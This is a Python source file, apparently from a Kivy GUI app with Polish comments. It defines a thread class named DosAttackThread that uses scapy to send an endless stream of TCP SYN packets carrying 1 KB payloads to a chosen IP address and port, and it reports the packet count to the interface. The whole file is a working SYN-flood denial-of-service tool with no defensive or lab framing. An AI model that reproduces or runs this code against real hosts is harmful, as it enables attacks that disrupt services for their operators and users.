from kivy.clock import Clock
from threading import Thread
from scapy.all import IP, TCP, Raw, RandShort, send
from kivymd.uix.label import MDLabel

class DosAttackThread(Thread):
    def __init__(self, app_instance, ip, port):
        super(DosAttackThread, self).__init__()
        self.daemon = True
        self.app_instance = app_instance
        self.ip = ip
        self.port = port
        self.running = False
        self.packet_count = 0  # Licznik wysłanych pakietów

    def run(self):
        self.running = True
        while self.running:
            ip = IP(dst=self.ip)
            tcp = TCP(sport=RandShort(), dport=self.port, flags="S")
            raw = Raw(b"X" * 1024)
            p = ip / tcp / raw
            send(p, verbose=0)
            
            # Aktualizuj wynik w głównym wątku Kivy
            self.packet_count += 1
            Clock.schedule_once(lambda dt: self.app_instance.update_syn_attack_result(f'Attack sent to {self.ip}:{self.port}, Packets: {self.packet_count}'), 0)

